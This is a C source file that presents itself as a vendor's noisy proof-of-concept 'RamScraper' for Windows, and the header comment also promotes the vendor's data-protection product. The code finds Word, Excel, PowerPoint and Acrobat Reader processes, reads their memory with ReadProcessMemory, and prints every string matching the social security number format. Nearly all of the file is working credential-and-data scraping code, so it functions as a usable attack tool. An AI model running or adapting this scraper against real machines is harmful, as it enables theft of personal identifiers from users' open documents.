/*
	This is a basic, unoptimized, unhidden and purposefully noisy proof of concept RamScraper to attack “Data In Use”.
	Data In Use is when a running application has a data open in memory and is operating on the data. Current DLP/IRM
	products don’t protect data in use, leaving it vulnerable to RamScrapers such as this one. The idea of this
	RamScraper is to prove how easy it is to defeat all current DLP/IRM products by attacking "Data In Use", but not
	to help the bad guys build an optimized and stealthy attack tool. Therefore we are trying to evade DLP/IRM, but
	are trying to deliberately be caught by EDR/AVs.

	A1Logic’s A1FILO product uniquely protects data “In Use”, and also protects data at rest and in transit like other
	DLP/IRM products on the market. Therefore A1FILO stops this RamScraper, but no other DLP/IRM product in the market
	can stop this RamScraper.

	This RamScraper reads the memory of running programs such as Microsoft Word, Excel, PowerPoint and Adobe Acrobat,
	and looks for data resembling social security numbers. Specifically, this is data of the format:

	XXX-XX-XXXX

	Where X is any digit. Then, this RamScraper copies any matching data out of the memory of the running program and
	prints it out.

	Instructions:
	1) Create and save files containing data in the format of social security numbers (SSNs) with each of the
	aforementioned programs. These can even be fake SSNs as long as they follow the format.
	2) Enable all your DLP/IRM products to maximum security, configured to encrypt sensitive data. For added effect,
	encrypt the files containing sensitive data and maybe even encrypt your hard drive.
	3) Open the various files containing social security numbers with their respective programs.
	4) Run the RamScraper and watch it bypass the security of all your products and steal the “Data In Use”.

	See www.A1Logic.com for more details about how to defend against this type of attack.
*/

#include <Windows.h>
#include <stdio.h>
#include <processthreadsapi.h>
#include <memoryapi.h>
#include <Psapi.h>
#include <stdexcept>


#define PAGE_SIZE 4096
#define NUMBER_PAGES 2

#define LOCAL_BUFFER_COUNT_WCHARS ((NUMBER_PAGES * PAGE_SIZE)/sizeof(WCHAR))
#define SSN L"000-00-0000"

#define IMAGE_FILE_LARGE_ADDRESS_AWARE_MAX_ADDRESS 0x100000000

PVOID localCopyPointer;
HANDLE processHandle;

// entire pattern must be < 4096 bytes
inline WCHAR derefCharacter(PWCHAR ptr)
{
	PWCHAR localBuffer = (PWCHAR)localCopyPointer;
	SIZE_T numBytesRead = 0;
	UINT64 index = (UINT64)ptr / sizeof(WCHAR);
	BOOL result;
	static PWCHAR lastPtrCopied = (PWCHAR)-1;// we will never have upper bound of target VM search equal to 0xFFFFFFFF'FFFFFFFF

	if ((UINT64)ptr % PAGE_SIZE == 0 && ptr != lastPtrCopied)// if ptr is ever page aligned and new...
	{
		// copy the remote page that ptr currently points to the base of...
		result = ReadProcessMemory(processHandle, (PVOID)ptr, (PVOID)& localBuffer[index % LOCAL_BUFFER_COUNT_WCHARS], PAGE_SIZE, &numBytesRead);
		if (!result || numBytesRead != PAGE_SIZE)
			throw std::range_error("bad address");
		lastPtrCopied = ptr;
	}
	return localBuffer[index % LOCAL_BUFFER_COUNT_WCHARS];
}

inline BOOL isDash(PWCHAR ptr)
{
	return derefCharacter(ptr) == '-';
}

inline BOOL isDigit(PWCHAR ptr)
{
	WCHAR wcharValue = derefCharacter(ptr);
	return wcharValue >= '0' && wcharValue <= '9';
}

BOOL isSocialSecurityNumber(PWCHAR ptr)
{
	return isDigit(ptr++) &&
		isDigit(ptr++) &&
		isDigit(ptr++) &&
		isDash(ptr++) &&
		isDigit(ptr++) &&
		isDigit(ptr++) &&
		isDash(ptr++) &&
		isDigit(ptr++) &&
		isDigit(ptr++) &&
		isDigit(ptr++) &&
		isDigit(ptr++);
}

int Name2PIDs(const WCHAR* processName, DWORD** returnedPIDs, size_t* numPidsFound)
{
	DWORD PIDs[1024], cbNeeded;

	*returnedPIDs = NULL;
	*numPidsFound = 0;
	if (processName == NULL || !EnumProcesses(PIDs, sizeof(PIDs), &cbNeeded))
		return 0;

	// Find the Process of interest.
	for (UINT PIDCounter = 0; PIDCounter < cbNeeded / sizeof(PIDs[0]); PIDCounter++)
	{
		// Get the process handle.
		HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PIDs[PIDCounter]);
		if (hProcess == NULL)
			continue;

		// Get the name of the process.
		WCHAR currentProcessName[_MAX_FNAME];
		DWORD retVal = GetProcessImageFileName(hProcess, currentProcessName, sizeof(currentProcessName) / sizeof(currentProcessName[0]));
		CloseHandle(hProcess);
		if (retVal == 0)
			continue;

		WCHAR* lastOccurence;
		lastOccurence = wcsrchr(currentProcessName, L'\\');
		if (lastOccurence && !wcsncmp(processName, lastOccurence+1, _MAX_FNAME))
		{
			(*numPidsFound)++;
			PVOID reallocRetVal = realloc(*returnedPIDs, sizeof(PIDs[0]) * (*numPidsFound));
			if (reallocRetVal == NULL)
			{
				free(*returnedPIDs);
				*returnedPIDs = NULL;
				return -1;
			}
			*returnedPIDs = (DWORD*)reallocRetVal;
			(*returnedPIDs)[(*numPidsFound) - 1] = PIDs[PIDCounter];
		}
	}
	return 0;
}

int main()
{
	LPCWSTR logMessages[] = { L"A1Logic RAM Scraper Demo is bypassing DLP/IRM by attacking \"Data In Use\"" };
	const WCHAR* targetProcessesArray[] = { L"WINWORD.EXE", L"AcroRd32.exe", L"EXCEL.EXE", L"POWERPNT.EXE" };
	UINT targetProcessArrayElements = sizeof(targetProcessesArray) / sizeof(targetProcessesArray[0]);
	PWCHAR current = (PWCHAR)0;
	size_t numPids = 0;
	int retVal = -1;
	DWORD* PIDs;

	HANDLE eventLogHandle = RegisterEventSourceA(NULL, "RamScraper");
	ReportEvent(eventLogHandle, EVENTLOG_INFORMATION_TYPE, 0, 0, NULL, 1, 0, logMessages, 0);
	DeregisterEventSource(eventLogHandle);

	localCopyPointer = VirtualAlloc(NULL, NUMBER_PAGES * PAGE_SIZE, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
	if (!localCopyPointer)
		return retVal;

	for (UINT targetProgramIndex = 0; targetProgramIndex < targetProcessArrayElements; targetProgramIndex++)
	{
		if (Name2PIDs(targetProcessesArray[targetProgramIndex], &PIDs, &numPids) == -1)
			continue;
		wprintf(L"%s:\n", targetProcessesArray[targetProgramIndex]);
		for (UINT PIDCounter = 0; PIDCounter < numPids; PIDCounter++)
		{
			processHandle = OpenProcess(PROCESS_VM_READ, FALSE, PIDs[PIDCounter]);
			if (!processHandle)
				continue;
			//wprintf(L"%d:\n", PIDs[PIDCounter]);
			current = 0;
			while (current < (PWCHAR)IMAGE_FILE_LARGE_ADDRESS_AWARE_MAX_ADDRESS)
			{
				try
				{
					if (isSocialSecurityNumber(current))
					{
						for (UINT i = 0; i < (sizeof(SSN) / sizeof(WCHAR)) - 1; i++)
							wprintf(L"%c", derefCharacter(current + i));
						wprintf(L"\n");
					}
				}
				catch (std::range_error e)
				{
					current = (PWCHAR)(((UINT64)current & (~(PAGE_SIZE - 1))) + PAGE_SIZE);
					continue;
				}
				current++;
			}
		}
		free(PIDs);
		retVal = 0;
		CloseHandle(processHandle);
	}

	VirtualFree(localCopyPointer, PAGE_SIZE, MEM_FREE);
	return retVal;
}